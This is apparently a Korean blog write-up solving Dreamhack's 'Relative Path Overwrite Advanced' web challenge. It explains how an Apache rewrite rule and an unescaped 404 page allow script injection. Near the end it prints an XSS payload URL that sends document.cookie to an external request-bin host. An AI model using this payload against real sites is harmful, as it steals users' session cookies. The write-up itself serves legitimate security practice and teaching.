---
title: "드림핵 lv.2 - Relative Path Overwrite Advanced"
date: 2025-03-26 00:10:00 +0800
categories: [Wargame, Dreamhack]
tags: [cyber security, writeup, dreamhack, web hacking, rpo, relative path overwrite] 
description: 드림핵 Relative Path Overwrite Advanced 웹해킹 워게임 풀이
---

[https://dreamhack.io/wargame/challenges/440](https://dreamhack.io/wargame/challenges/440)
# 문제 설명
Exercise: Relative Path Overwrite의 패치된 문제입니다.

---
# 문제 풀이
## 웹사이트 분석
웹사이트는 이 전에 풀이했던 [Relative Path Overwrite](https://hoonsooni.com/posts/dreamhack_relative_path_overwrite/)과 정확하게 일치하기 때문에 분석할 것이 없다.

유일하게 다른 차이점은 /?page=vuln에 접근했을 때 param 값에 상관없이 "nope !!"이 출력된다는 점인데, filter.js 파일이 제대로 읽혀지지 않기 때문이다.
## 코드 분석
### 000-default.conf
```
RewriteEngine on
RewriteRule ^/(.*)\.(js|css)$ /static/$1 [L]

ErrorDocument 404 /404.php
```
이번에 새로 추가된 설정 파일이다.<br />
이번 웹 서비스는 아파치 서버를 사용하는 모양인지 아파치의 RewriteEngine 모듈을 사용하는 모양이다.<br />
해당 모듈을 이용하여 일종의 redirection을 수행하고 있다. 예를 들어 sample.js를 요청할 때 "/static/sample.js"로 바꾸어 버린다는 것이다.<br />
### 404.php
```php
<?php 
    header("HTTP/1.1 200 OK");
    echo $_SERVER["REQUEST_URI"] . " not found.";
?>
```
이번에도 또 새로 생긴 404.php 파일이다.<br />
해당 서버에서 404 에러가 발생할 시에 해당 php 파일이 리턴된다. <br />
여기서 주목해야 할 점은 유저가 적은 URL 값을 그대로 출력한다는 점이다. 여기서 RPO 취약점이 발생한다.
## 최종 풀이
우리가 해야하는 것은 결국 이 전 문제와 동일하게 임의의 스크립트를 통해 플래그 값을 읽어오는 것이다.<br />
해당 문제는 RPO 취약점을 연습하는 문제이기 때문에 해당 방식의 풀이를 고민해 보아야한다.<br />
### /?page=vuln 페이지의 문제
이번 vuln 페이지에서는 전에도 이야기했듯이 filter.js가 올바르게 로드되지 못하고있다.<br />
어떠한 param 값을 전달해도 계속해서 "nope !!"만 출력할 뿐이고 콘솔에도 filter.js에서 문법 에러가 발생했다는 메세지도 볼 수 있다. 추가적으로 Network 탭에서 filter.js 요청의 응답을 보면 파일 안에 "/filter.js not found."라는 문자만 남아있을 뿐이다.<br />

원래 filter.js 내용이 담겨있지 않고 404.php의 내용이 담겨있다.<br />
#### 여기서 얻을 수 있는 힌트
여기서 우리는 filter.js가 올바르게 로딩되고 있지 않지만 "로딩" 자체는 되고있다는 정보를 얻을 수 있다.<br />
로딩 자체는 되지만 안에 내용물이 404에러로 인한 404.php 파일의 내용으로 변환되는 듯한 결과를 볼 수 있다.<br />

404.php의 내용은 유저가 입력한 URL 값을 출력한다.<br />
유저가 입력한 값을 아무런 필터도 거치지 않고 그대로 출력하기 때문에 취약점이 발생한다는 것을 알 수 있다.<br />
### 익스플로잇
vuln 페이지에 접속했을 때 filter.js 파일 안에는 "/filter.js not found."라는 메세지가 들어있었다.<br />
해당 메세지로 인해서 콘솔에서는 unclosed 정규식 표현으로 인식하여 에러 메세지를 출력하는 것이다.<br />

메세지의 "/filter.js" 부분은 vuln 페이지의 `<script src="/filter.js"></script>`로부터 출력되는 것이다. 즉, URL로 다른 값을 입력하면 filter.js 파일에는 해당 URL 값이 전달된다는 것을 의미한다.<br />

```
http://host3.dreamhack.games:10389/sample.js
```
이런식으로 "sample.js" 파일에 접근하면 404.php에 의해서 "sample.js not found."가 출력되는 것이다.<br />

```
http://host3.dreamhack.games:10389/index.php/;alert(1);//?page=vuln
```
만약 URL을 이렇게 입력한다면 filter.js 내부에는 `/index.php/;alert(1);//filter.js not found.`가 입력되는 셈이다. `;`은 자바스크립트에서 한 스크립트의 끝을 의미한다. 즉, "/index.php/;"처럼 작성하여 마치 한 스크립트를 끝내고자 하는 듯이 조작한 것이다.<br />

여기서 "/index.php/"는 올바른 스크립트 코드가 아니기 때문에 문법 에러가 발생하겠지만 자바스크립트 특성상 이 전의 스크립트에서 문제가 발생하여도 그 다음 스크립트는 그대로 실행하기 때문에 그 다음인 "alert(1);"를 수행하는 것이다.<br />

이때 `alert(1)`이라는 코드가 실행되면서 alert 창이 올바르게 뜨게되고 그 다음 "//"을 입력해주어 "filter.js not found." 부분을 주석 처리 해주는 방식인 것이다.

```
http://host3.dreamhack.games:24191/index.php/;location.href='https://mjusrvc.request.dreamhack.games/'+document.cookie;//?page=vuln
```
`alert(1)` 대신에 우리에게 필요한 코드를 작성하여 report 페이지로 URL을 보내주면 드림핵의 Request Bin에서 플래그를 읽어낼 수 있다.
# 배운 것
Relative Path Overwrite이 언제 발생하는지에 대해서 한층 더 깊은 이해를 도와주는 문제였다.<br />
그리고 RewriteEngine과 같은 모듈의 존재에 대해서 알게됐다.